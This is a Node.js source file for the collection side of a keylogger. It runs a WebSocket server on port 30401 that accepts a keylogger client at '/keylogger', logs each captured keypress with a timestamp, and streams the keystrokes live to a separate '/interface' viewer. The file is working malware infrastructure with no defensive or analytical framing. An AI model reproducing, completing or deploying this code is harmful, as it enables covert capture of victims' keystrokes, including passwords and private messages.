const WebSocket = require('ws');
const http = require('http');
const url = require('url');

let server,
	interfaceWSServer,
	keyloggerWSServer = null;

let clients = {
	interface: null,
	keylogger: null
};

const startWSServer = () => {
	console.log('Websocket server is on!');

	server = http.createServer();
	interfaceWSServer = new WebSocket.Server({ noServer: true });
	keyloggerWSServer = new WebSocket.Server({ noServer: true });

	server.on('upgrade', (req, socket, head) => {
		const path = url.parse(req.url).pathname;

		switch (path) {
			case '/interface':
				interfaceWSServer.handleUpgrade(req, socket, head, (ws) => {
					interfaceWSServer.emit('connection', ws, req);
				});
				break;
			case '/keylogger':
				keyloggerWSServer.handleUpgrade(req, socket, head, (ws) => {
					keyloggerWSServer.emit('connection', ws, req);
				});
				break;
			default:
				Log.warn(`websocket: got request for ${path} -> invalid`);
				socket.destroy();
		}
	});

	keyloggerWSServer.on('connection', (socket, request) => {
		if (!clients.keylogger) {
			console.log('Keylogger connected!');
			clients.keylogger = socket;

			sendDataToInterface(
				JSON.stringify({
					type: 'status',
					data: {
						status: 'on'
					}
				})
			);

			socket.on('message', (data) => {
				// if one combination was pressed: ctrl + letter, it will be ignored
				if (!data.split(',')[1].split(':')[1].includes(`\\x`)) {
					const { timestamp, keyPressed } = JSON.parse(data);

					console.log(`${timestamp}: Keypressed: ${keyPressed}`);

					//send to interface
					sendDataToInterface(
						JSON.stringify({
							type: 'key',
							data: {
								timestamp,
								keyPressed
							}
						})
					);
				}
			});

			socket.on('close', (data) => {
				console.log('Keylogger disconnected!');

				sendDataToInterface(
					JSON.stringify({
						type: 'status',
						data: {
							status: 'off'
						}
					})
				);

				clients.keylogger = null;
			});

			socket.on('error', (error) => {
				console.log(`Socket Error ${error}: Keylogger disconnected!`);

				sendDataToInterface(
					JSON.stringify({
						type: 'status',
						data: {
							status: 'off'
						}
					})
				);

				clients.keylogger = null;
			});
		}
	});

	keyloggerWSServer.on('close', () => {
		console.log('KeyloggerWSServer closed!');
		if (clients.keylogger) {
			// closing the socket asigned to keyloggerWS
			clients.keylogger.terminate();
			clients.keylogger = null;
		}
	});

	keyloggerWSServer.on('error', (error) => {
		console.log('KeyloggerWSServer Error -> closed');
		if (clients.keylogger) {
			clients.keylogger.terminate();
			clients.keylogger = null;
		}
	});

	interfaceWSServer.on('connection', (socket, request) => {
		if (!clients.interface) {
			console.log('Interface connected!');
			clients.interface = socket;

			socket.on('message', (data) => {});

			socket.on('close', (data) => {
				console.log('Interface disconnected!');
				clients.interface = null;
			});

			socket.on('error', (error) => {
				console.log(`Socket Error ${error}: Interface disconnected!`);
				clients.interface = null;
			});
		}
	});

	interfaceWSServer.on('close', () => {
		console.log('interfaceWSServer closed!');
		if (clients.interface) {
			// closing the socket asigned to interfaceWS
			clients.interface.terminate();
			clients.interface = null;
		}
	});

	interfaceWSServer.on('error', (error) => {
		console.log('InterfaceWSServer Error -> closed');
		if (clients.interface) {
			clients.interface.terminate();
			clients.interface = null;
		}
	});

	server.listen(30401);
};

const sendDataToInterface = (data) => {
	if (clients.interface) {
		clients.interface.send(data);
	}
};

startWSServer();
